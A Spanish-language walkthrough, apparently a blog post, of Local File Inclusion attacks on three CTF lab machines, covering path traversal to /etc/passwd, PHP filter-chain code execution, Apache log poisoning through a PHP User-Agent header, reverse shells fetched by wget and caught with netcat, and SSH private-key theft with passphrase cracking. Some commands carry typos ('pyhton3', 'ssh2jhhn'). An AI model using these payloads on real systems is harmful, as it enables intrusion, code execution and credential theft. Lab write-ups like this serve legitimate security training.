---
title: "LFI (Local File Inclusión) [Basico]" 
excerpt: "Ejemplos de ejecucion de un Local File Inclusión"
header:
  teaser: "/assets/images/PathTraversal.jpg"
categories:
  - Vulnerabilidades 
---


## Maquina Chain  - VulNyx ( Intrusión básica )
### Parámetros de explotación
 * Url: utils.chaincorp.nyx/include.php?in=whoami.php
### Métodos de explotación 
 * Path traversal hacia el directorio `/etc/passwd`
```bash
utils.chaincorp.nyx/include.php?in=../../../../../../etc/passwd
```

 * Wrapper LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
Intentaremos ver el archivo `include.php` con un wapper

```bash
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Nos quedaría así `utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php`

El siguiente paso seria usar https://github.com/synacktiv/php_filter_chain_generator para ejecutar comandos de la siguiente forma 

```bash
pyhton3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
```

 * Obtener Reverse Shell: al ser la data muy grande el navegador no nos permite ingresarla, para lo cual creamos un archivo `index.html` donde pegamos nuestra reverse Shell, levantamos un servidor con Python `python3 -m http.server 80` y aplicamos al comando un `wget` con dirección a nuestro servidor.
 ```bash
 pyhton3 php_filter_chain_generator.py --chain "<?php system('wget 192.168.0.0'); ?>"
```

una ves se encuentre subido tendremos que saber que se subió como `index.html.1` ya que el servidor ya tiene un archivo con le mismo nombre, ahora solo nos queda ejecutar y ponernos en escucha con netcat, para ello usamos:

nos ponemos en escucha:

```bash
sudo nc -nlvp 443
```

tiramos la ejecución de la reverse Shell

```bash
 pyhton3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
```

y listo, la intrusión esta terminada.

---

## Archangel - TryHackMe ( Intrusión con log poisoning ) 
### Parámetros de explotación 
 * Url: como notamos la URL interactúa con archivos de la maquina  `http://mafialive.thm/test.phpview=/var/www/html/development_testing/mrrobot.php`
### Métodos de explotación
 * Pad traversal hacia `etc/passwd`
 
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd
```
 * Probamos con un Log poisoning tirando hacia el archivo `var/log/apache2/access.log` el cual es un archivo que contiene los logs de apache con lo cual ya podríamos ejecutar comandos.

```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log
```

ahora al tener los Logs podemos usarlos usando una petición http al domino de la siguiente forma:

``` bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
```

y revisamos en los logs, de tal forma que podemos como el servidor responde. acto seguido realizamos un archivo .sh con una reverse Shell, levantamos un servidor con python3 y procedemos ha realizar un `wget` al servidor a fin de poder tener el archivo en la maquina y ejecutarlo, para ello, podemos usar:

```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://192.168.10.1/pwned.sh'); ?>"
```

luego debemos darle permisos de ejecución usando el mismo comando con `chmod 777 revershell`, nos ponemos a la escucha con netcat usando `nc -nlvp 443` y procedemos a ejecutar el archivo dentro de la maquina victima  y woala, estamos dentro.


---
## FRIENDLY2 - HackMyVM ( Intrusión con id_rsa )
### Parámetros de explotación
 * Url: Como podemos ver en la URL estamos accediendo a un documento `192.168.0.23/tools/check_if_exist.php?doc=keyboard.html`

### Métodos de explotación
 * Usamos Pad traversal básico `/../../../../` a fin de acceder a `/etc/passwd`, aquí podemos ver que existe el usuario gh0st el cual puede ejecutar código bash. Nosotros nos centraremos en realizar el mismo pad traversal pero hacia el directorio id_rsa de la siguiente forma: 
```bash
192.168.0.23/tools/check_if_exist.php/?doc=../../../../../../../home/gh0st/.ssh/id_rsa
```

encontramos la clave privada para una conexión ssh, le damos permisos de ejecución `chmod 600 id_rsa`, pero estos ficheros normalmente usan un salvoconducto el cual encontraremos sometiendo la clave privada a un proceso con JhonTheRip de la siguiente forma:

```bash
ssh2jhhn id_rsa >> hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

y sacamos nuestro salvo conducto que es `celtic`, realizamos la conexión ssh  y finalmente logramos hacer la intrusión. 
```bash
ssh -i id_rsa gh0st@192.168.0.23
```

y wuala!.

